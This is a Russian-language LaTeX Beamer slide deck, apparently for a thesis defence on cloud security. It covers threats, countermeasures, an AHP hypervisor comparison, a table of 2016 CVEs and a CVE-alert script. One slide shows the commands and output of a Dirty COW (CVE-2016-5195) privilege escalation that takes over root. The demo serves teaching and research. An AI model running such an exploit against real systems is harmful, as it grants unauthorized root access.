%%% Содержимое слайдов

\frame[plain]{\titlepage} % Титульный слайд

%-------------------------------------------------------------------------------

\section{Стандарты безопасности в облаках}

\begin{frame}
\frametitle{\insertsection}

Наиболее активные рабочие группы:
\begin{itemize}
    \item Cloud Security Alliance (CSA)
    \item National Institute of Standards and Technology (NIST)
    \item Internet Engineering Task Force (IETF)
    \item Open Data Center Alliance (ODCA)
\end{itemize}

\vspace{\baselineskip}

Они занимаются:
\begin{itemize}
    \item продвижением идей соблюдения безопасности
    \item исследованиями по защите облаков
    \item разработкой руководств по безопасности
    \item организацией форумов по безопасности
\end{itemize}
\end{frame}

%-------------------------------------------------------------------------------

\section{Угрозы безопасности}

\begin{frame}
\frametitle{\insertsection}

\begin{itemize}
    \item утечка данных
    \item компрометация учетных записей и обход аутентификации
    \item взлом интерфейсов и API
    \item уязвимость используемых систем
    \item кража учетных записей
    \item инсайдеры-злоумышленники
    \item целевые кибератаки
    \item перманентная потеря данных
    \item недостаточная осведомленность
    \item злоупотребление облачными сервисами
    \item DDoS-атаки
    \item совместные технологии, общие риски
\end{itemize}
\end{frame}

%-------------------------------------------------------------------------------

\section{Борьба с проблемами}

\begin{frame}
\frametitle{\insertsection}

\begin{itemize}
    \item многофакторная аутентификация (2FA)
    \item стойкое шифрование (TLS)
    \item использование одноразовых паролей, токенов, USB-ключей, смарт-карт
    \item контроль доступа, шифрование API
    \item периодические пентестинги, аудиты безопасности
    \item регулярное сканирование на наличие уязвимостией
    \item мониторинг, аудит и логирование
    \item резервное копирование, репликация
    \item резервирование сетевых каналов и сегментация сети
\end{itemize}
\end{frame}

%-------------------------------------------------------------------------------

\section{Решение проблем в рамках ВКР}

\begin{frame}
\frametitle{\insertsection}

\begin{itemize}
    \item структурирование имеющейся информации по безопасности
    \item системный анализ полученной информации
    \item выбор альтернатив согласно набору критериев (МАИ)
    \item практическое применение полученной информации
    \item анализ наиболее опасных уязвимостей
    \item эксплуатация уязвимостей в облачной среде
    \item создание методов быстрого реагирования на уязвимости
\end{itemize}
\end{frame}

%-------------------------------------------------------------------------------

\section{Системный анализ}

\begin{frame}
\frametitle{\insertsection}

\begin{itemize}
    \item цель проектирования --- разработка системы безопасности облачной среды
    \item выделение входных и выходных данных
    \item выделение функций и подсистем
    \item организация модульности системы
    \item детализация функций и подсистем
    \item соблюдение принципа иерархии
    \item сочетание централизации и децентрализации
    \item возможность расширения системы
    \item учет неопределенностей и случайностей
\end{itemize}
\end{frame}

%-------------------------------------------------------------------------------

\section{Вариантный анализ}

\begin{frame}
\frametitle{\insertsection}
\framesubtitle{Пример --- выбор гипервизора}

\begin{columns}
    \begin{column}{0.45\textwidth}
        Альтернативы:
        \vspace{\baselineskip}
        \begin{itemize}
            \item KVM
            \item Hyper-V
            \item VMware vSphere
        \end{itemize}
    \end{column}
    \begin{column}{0.55\textwidth}
        Критерии выбора:
        \begin{itemize}
            \item цена (А1)
            \item масштабируемость (А2)
            \item отказоустойчивость (А3)
            \item интерфейсы управления (А4)
        \end{itemize}
    \end{column}
\end{columns}

\begin{table}
    \begin{tabular}{|l|l|l|l|l|l|}
      \hline \multicolumn{2}{|c|}{\textbf{Критерии}} & \textbf{A1} & \textbf{A2} & \textbf{A3} & \textbf{A4} \\
      \hline \textbf{A1} & Цена & \textbf{1} & 1/5 & 1/7 & 3 \\
      \hline \textbf{A2} & Масштабируемость & 5 & \textbf{1} & 1/5 & 7 \\
      \hline \textbf{A3} & Отказоустойчивость & 7 & 5 & \textbf{1} & 8 \\
      \hline \textbf{A4} & Интерфейсы управления & 1/3 & 1/7 & 1/8 & \textbf{1} \\
      \hline
    \end{tabular}
\end{table}
\end{frame}

%-------------------------------------------------------------------------------

\section{Критические уязвимости 2016 г.}

\begin{frame}
\frametitle{\insertsection}

\begin{table}
    \begin{tabular}{|l|l|p{4cm}|l|}
        \hline \textbf{CVE ID} & \textbf{CVSS} & \textbf{Тип уязвимости} & \textbf{ПО} \\
        \hline CVE-2016-5195 & 7.2 & Получение привилегий & Linux Kernel \\
        \hline CVE-2016-6258 & 7.2 & Получение привилегий & Xen \\
        \hline CVE-2016-5696 & 5.8 & Получение данных & Linux Kernel \\
        \hline CVE-2016-3710 & 7.2 & Запуск кода & QEMU \\
        \hline CVE-2016-8655 & 7.2 & Получение привилегий, DoS & Linux Kernel \\
        \hline CVE-2016-4997 & 7.2 & Получение привилегий, DoS, доступ к памяти & Linux Kernel \\
        \hline CVE-2016-4484 & 7.2 & Получение привилегий & CryptSetup \\
        \hline CVE-2016-6309 & 10.0 & DoS, запуск кода & OpenSSL\\
        \hline
    \end{tabular}
\end{table}
\end{frame}

%-------------------------------------------------------------------------------

\section{Эксплуатация CVE-2016-5195}

\begin{frame}
\frametitle{\insertsection}
\framesubtitle{Dirty COW (Copy-on-write)}

{\small \texttt{\$ id \\
{\color{green} uid=1000(dcow)} gid=1000(dcow) groups=1000(dcow)
}}

\vspace{\baselineskip}

{\small \texttt{\$ g++ dcow.cpp -std=c++11 -pthread -lutil -o dcow \\
\$ ./dcow \\
Running ... \\
Received su prompt (Password: ) \\
Root password is: dirtyCowFun \\
Enjoy! :-)}}

\vspace{\baselineskip}

{\small \texttt{\$ su root \\
Password: dirtyCowFun \\
\# id \\
{\color{red} uid=0(root)} gid=0(root) groups=0(root)
}}
\end{frame}

%-------------------------------------------------------------------------------

\section{Vulncontrol}

\begin{frame}
\frametitle{\insertsection}

{\scriptsize \texttt{\$ ./vulncontrol.py −d 2017−02−18 −m 5 -t \$TOKEN:\$ID \\
CVE−2017−6074 9.3 http://www.cvedetails.com/cve/CVE−2017−6074/ \\
CVE−2017−6001 7.6 http://www.cvedetails.com/cve/CVE−2017−6001/ \\
CVE−2017−5986 7.1 http://www.cvedetails.com/cve/CVE−2017−5986/ \\
Telegram alert sent
}}

\begin{figure}[h]
    \center
    \includegraphics[width=0.65\linewidth]{tscreen}
\end{figure}
\end{frame}

%-------------------------------------------------------------------------------

\iffalse
максимум 10 слайдов
по 1 минуте на слайд
картинки, схемы, таблицы, примеры кода, списки, скриншоты

обзор источников
системный анализ
вариантный анализ
безопасность облачных вычислений
экспериментальные исследования
- крит. уязвимости
- эксплуатация dirty cow
- vulncontrol
анализ результатов

1. описать актуальность исследования
2. описать текущие проблемы в облаках
3. как эти проблемы решаются
4. какие проблемы не решаются
5. что я сделал для решения проблем
...
\fi